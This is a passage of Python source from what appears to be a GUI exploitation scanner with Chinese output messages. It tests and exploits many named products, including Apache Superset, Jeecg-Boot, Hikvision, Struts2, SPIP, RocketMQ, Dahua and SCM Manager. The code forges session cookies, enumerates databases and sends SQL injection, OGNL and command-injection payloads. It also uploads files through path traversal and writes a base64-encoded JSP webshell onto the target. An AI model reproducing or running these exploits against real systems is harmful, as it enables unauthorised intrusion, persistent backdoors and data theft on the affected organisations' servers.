                                self.append_to_output(f'Superset版本: {version}', "yellow")

                                for i, k in enumerate(SECRET_KEYS):
                                    cracked = session.verify(session_cookie, k)
                                    if cracked:
                                        break

                                if not cracked:
                                    self.append_to_output('无法破解会话cookie', "green")
                                else:
                                    self.append_to_output(f'存在Apache Superset未授权访问CVE-2023-27524漏洞 - 使用默认的SECRET_KEY: {k}', "red")

                                    try:
                                        user_id = int(1)
                                    except:
                                        user_id = 1

                                    forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k)
                                    self.append_to_output(f'伪造用户1的会话cookie {user_id}: {forged_cookie}', "red")
                                    validate = True
                                    if validate:
                                        validated = False
                                        try:
                                            headers['Cookie'] = f'session={forged_cookie}'
                                            self.append_to_output(f'在使用伪造的cookie之前暂停5秒以考虑时间漂移...', "yellow")
                                            sleep(5)
                                            req = requests.get(encodetext, headers=headers, verify=False, timeout=30, proxies=self.proxies)
                                            if req.status_code == 302:
                                                self.append_to_output(f'登录时获得了状态码302，伪造的cookie似乎已被接受', "red")
                                                validated = True
                                            else:
                                                self.append_to_output(f'获取状态码 {req.status_code} 不是预期的重定向302. 伪造的cookie似乎无效.重新检查用户ID.', "green")
                                        except Exception as e_inner:
                                            self.append_to_output(f'获取错误 {e_inner} 不是预期的重定向302. 伪造的cookie似乎无效.重新检查用户ID.', "green")

                                        self.append_to_output('列举数据库（Enumerating databases）', "red")
                                        for i in range(1, 101):
                                            database_url_base = url + '/api/v1/database'
                                            try:
                                                r = requests.get(f'{database_url_base}/{i}', headers=headers, verify=False,
                                                                 timeout=30, allow_redirects=False)
                                                if r.status_code == 200:
                                                    result = r.json()['result']  # validate response is JSON
                                                    name = result['database_name']
                                                    self.append_to_output(f'发现数据库 {name}', "red")
                                                elif r.status_code == 404:
                                                    self.append_to_output(f'完成数据库枚举', "yellow")
                                                    break  # no more databases
                                                else:
                                                    self.append_to_output(f'Unexpected error: status code={r.status_code}', "green")
                                                    break
                                            except Exception as e_inner:
                                                self.append_to_output(f'Unexpected error: {e_inner}', "green")
                                                break
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "25.深信服EDR命令执行(CNVD-2020-46552)":
                    if url.endswith("/"):
                        path = "tool/log/c.php?strip_slashes=system&host=id"
                    else:
                        path = "/tool/log/c.php?strip_slashes=system&host=id"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
                    }
                    try:
                        req = requests.get(encodetext,verify=False,allow_redirects=False, timeout=20, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'uid=' in res:
                            self.append_to_output(f"[+] {url} 存在深信服EDR命令执行(CNVD-2020-46552)！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在深信服EDR命令执行(CNVD-2020-46552)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在深信服EDR命令执行(CNVD-2020-46552)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "26.Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)":
                    if url.endswith("/"):
                        path = "jeecg-boot/jmreport/qurestSql"
                    else:
                        path = "/jeecg-boot/jmreport/qurestSql"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "application/json"
                    }
                    payload = {
                        "apiSelectId": "1316997232402231298",
                        "id": "1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '"
                    }

                    # Convert payload to JSON
                    json_payload = json.dumps(payload)
                    #self.proxies
                    try:
                        req = requests.post(encodetext, data=json_payload, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'XPATH' in res:
                            self.append_to_output(f"[+] {url} 存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "27.HIKVISION-海康威视isecure center 综合安防管理平台任意文件上传漏洞":
                    if url.endswith("/"):
                        path = "center/api/files;.js"
                    else:
                        path = "/center/api/files;.js"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "python-requests/2.26.0",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c"
                    }
                    payload = """
                    --ea26cdac4990498b32d7a95ce5a5135c
                    Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"
                    Content-Type: application/octet-stream

                    332299402
                    --ea26cdac4990498b32d7a95ce5a5135c--
                    """

                    # Convert payload to JSON
                    json_payload = json.dumps(payload)

                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=payload, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在海康威视isecure center 综合安防管理平台任意文件上传漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在海康威视isecure center 综合安防管理平台任意文件上传漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在海康威视isecure center 综合安防管理平台任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "28.PowerJob未授权访问漏洞(CVE-2023-29922)":
                    if url.endswith("/"):
                        path = "job/list"
                    else:
                        path = "/job/list"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    header = {
                        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                        'Content-Type': 'application/json;charset=UTF-8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
                    }
                    data = {
                        "appId": 1,
                        "index": 0,
                        "pageSize": 10
                    }

                    try:
                        #requests.packages.urllib3.disable_warnings()
                        #requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, json=data, headers=header,verify=False, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在PowerJob未授权访问漏洞(CVE-2023-29922)洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在PowerJob未授权访问漏洞(CVE-2023-29922)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在PowerJob未授权访问漏洞(CVE-2023-29922)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "29.浙江宇视科技 网络视频录像机远程命令执行漏洞":
                    if url.endswith("/"):
                        path = "Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bwhoami%3e1.txt"
                    else:
                        path = "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bwhoami%3e1.txt"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            if url.endswith("/"):
                                path = "Interface/LogReport/1.txt"
                            else:
                                path = "/Interface/LogReport/1.txt"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            encodetext = url + path
                            try:
                                req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                                res = req.text
                                if req.status_code == 200:
                                    self.append_to_output(f"[+] {url} 存在浙江宇视科技 网络视频录像机远程命令执行漏洞！！！！", "red")
                                    self.append_to_output(res, "yellow")
                                else:
                                    self.append_to_output(f"[-] {url} 不存在浙江宇视科技 网络视频录像机远程命令执行漏洞", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e))
                        else:
                            self.append_to_output(f"[-] {url} 不存在浙江宇视科技 网络视频录像机远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "30.华平信息AVCON6系统管理平台strut2远程代码执行漏洞":
                    if url.endswith("/"):
                        path = 'login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}%20GET%20/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}'
                    else:
                        path = '/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}%20GET%20/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}'

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在华平信息AVCON6系统管理平台strut2远程代码执行漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在华平信息AVCON6系统管理平台strut2远程代码执行漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在华平信息AVCON6系统管理平台strut2远程代码执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "31.Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)":
                    if url.endswith("/"):
                        path = 'Joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x7e,concat(0x7e,user()),0x7e)'
                    else:
                        path = '/Joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x7e,concat(0x7e,user()),0x7e)'

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if 'XPATH' in res:
                            self.append_to_output(f"[+] {url} 存在Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "32.狮子鱼CMS":
                    if url.endswith("/"):
                        path = 'and%20updatexml(1,concat(0x7e,database(),0x7e),1)'
                    else:
                        path = '/and%20updatexml(1,concat(0x7e,database(),0x7e),1)'

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if 'XPATH' in res:
                            self.append_to_output(f"[+] {url} 存在狮子鱼CMS！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在狮子鱼CMS！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在狮子鱼CMS", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "33.新开普智慧校园系统RCE漏洞":
                    if url.endswith("/"):
                        path = 'service_transport/service.action'
                    else:
                        path = '/service_transport/service.action'

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if 'message' in res:
                            self.append_to_output(f"[+] {url} 存在新开普智慧校园系统RCE漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在新开普智慧校园系统RCE漏洞！！！！" + "\n")
                                file.write(res + "\n")
                            data = {
                                'command': 'GetFZinfo',
                                'UnitCode': '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ >./webapps/ROOT/1.txt")}'
                            }
                            response = requests.post(encodetext, headers=headers, json=data, timeout=10, proxies=self.proxies)
                            nowres = response.text
                            if response.status_code == 200:
                                self.append_to_output(f"[+] {url} 新开普智慧校园系统RCE上传成功！！！！", "red")
                                self.append_to_output(nowres, "yellow")
                            else:
                                self.append_to_output(f"[-] {url} 新开普智慧校园系统RCE上传失败", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在新开普智慧校园系统RCE漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "34.SPIP远程代码执行漏洞(CVE-2023-27372)":
                    if url.endswith("/"):
                        path = "spip.php?page=spip_pass"
                    else:
                        path = "/spip.php?page=spip_pass"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    header = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Upgrade-Insecure-Requests": "1"
                    }

                    data = {
                        "page": "spip_pass",
                        "formulaire_action": "oubli",
                        "formulaire_action_args": "CSRF_TOKEN",
                        "oubli": 's:19:"<?php system(whoami); ?>";',
                        "nobot": ""
                    }

                    try:
                        #requests.packages.urllib3.disable_warnings()
                        #requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=header,verify=False, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在SPIP远程代码执行漏洞(CVE-2023-27372)！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在SPIP远程代码执行漏洞(CVE-2023-27372)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在SPIP远程代码执行漏洞(CVE-2023-27372)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "35.Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)":
                    #if not url.startswith('http://') and not url.startswith('https://'):
                    #    url = 'http://' + url

                    hostname = url
                    data_base64 = "AAAA0AAAALJ7ImNvZGUiOjMxOCwiZXh0RmllbGRzIjp7IkFjY2Vzc0tleSI6InJvY2tldG1xMiIsIlNpZ25hdHVyZSI6ImNHSmpxMUZCTSs0VUJsUnNORE50azBVOW5EMD0ifSwiZmxhZyI6MCwibGFuZ3VhZ2UiOiJKQVZBIiwib3BhcXVlIjowLCJzZXJpYWxpemVUeXBlQ3VycmVudFJQQyI6IkpTT04iLCJ2ZXJzaW9uIjo0MzV9dGhpc19pc19rZXk9dGhpc19pc192YWx1ZQo="
                    data = base64.b64decode(data_base64)
                    self.append_to_output("===================================================================","green")
                    try:
                        # 创建socket连接
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        server_address = (hostname, 9876)
                        sock.settimeout(5)
                        sock.connect(server_address)

                        # 发送请求
                        #request_data = bytes(data, "utf-8")
                        sock.send(data)

                        # 接收响应
                        sock.settimeout(10)
                        response_data = sock.recv(1024)
                        response = response_data.decode("utf-8")

                        # 关闭连接
                        sock.close()

                        # 处理响应
                        if '"code":0' in response and 'serializeTypeCurrentRPC' in response:
                            self.append_to_output(f"[+] {url} 存在Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)！！！！", "red")
                            self.append_to_output(response, "yellow")
                            #with open("output.txt", "a") as file:
                            #    file.write(f"[+] {url} 存在Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)！！！！" + "\n")
                            #    file.write(response + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)", "green")
                    except socket.timeout:
                        self.append_to_output(f"[!] 请求超时，跳过主机: {hostname}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "36.大华智慧园区综合管理平台RCE漏洞":
                    if url.endswith("/"):
                        path = "emap/devicePoint_addImgIco?hasSubsystem=true"
                    else:
                        path = "/emap/devicePoint_addImgIco?hasSubsystem=true"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    headers = {
                        "Content-Type": "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
                    }

                    data = '''--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name="upload"; filename="a.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\ntest123\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--'''
                    self.append_to_output("===================================================================", "green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        #requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=10, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在大华智慧园区综合管理平台RCE漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在大华智慧园区综合管理平台RCE漏洞！！！！" + "\n")
                                file.write(res + "\n")
                            response_data = json.loads(req.text)
                            data_value = response_data.get("data")
                            if data_value:
                                self.append_to_output(f"[+] 回显的jsp文件名:  {data_value} ", "yellow")
                                new_port = "8314"
                                pattern = r":\d+"
                                new_url = re.sub(pattern, ":" + new_port, url)
                                if new_url.endswith("/"):
                                    newpath = "upload/emap/society_new/"
                                else:
                                    newpath = "/upload/emap/society_new/"
                                end_newpath = new_url + newpath + data_value
                                print(end_newpath)
                                self.append_to_output(f"[+] 构造新的URL:  {end_newpath} ", "yellow")
                                try:
                                    newreq = requests.get(end_newpath, timeout=10, verify=False,proxies=self.proxies)
                                    newres = newreq.text
                                    if newreq.status_code == 200 and 'code' in newres:
                                        self.append_to_output(f"[+] {newres} 确认无误,存在漏洞！！！！", "yellow")
                                    else:
                                        self.append_to_output(f"[+] {newres} 可能不存在漏洞！！！！", "yellow")
                                except Timeout:
                                    self.append_to_output(f"[!] 寻找test123文件请求超时，跳过URL: {url}", "yellow")
                                except Exception as e:
                                    self.append_to_output(str(e))
                            else:
                                self.append_to_output("[-] 无法获取回显的jsp文件名", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在大华智慧园区综合管理平台RCE漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "37.艾科思应用接入系统存在任意文件读取漏洞":
                    if url.endswith("/"):
                        path = '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
                    else:
                        path = '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    self.append_to_output("===================================================================","green")
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and ';' in res:
                            self.append_to_output(f"[+] {url} 存在艾科思应用接入系统存在任意文件读取漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在艾科思应用接入系统存在任意文件读取漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在艾科思应用接入系统存在任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "38.SCM Manager XSS漏洞(CVE-2023-33829)":
                    if url.endswith("/"):
                        path = "scm"
                    else:
                        path = "/scm"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    main_url = url + path
                    auth_url = main_url + "/api/rest/authentication/login.json"
                    users = main_url + "/api/rest/users.json"
                    groups = main_url + "/api/rest/groups.json"
                    repos = main_url + "/api/rest/repositories.json"

                    headers = {
                        "Content-Type": "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
                    }
                    session = requests.Session()
                    post_data = {
                        'username': 'scmadmin',
                        'password': 'scmadmin'
                    }

                    self.append_to_output("===================================================================", "green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        #requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(auth_url, headers=headers, data=post_data, verify=False, timeout=10, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 登录成功，存在SCM Manager默认密码！！！！", "red")
                            #self.append_to_output(res, "yellow")
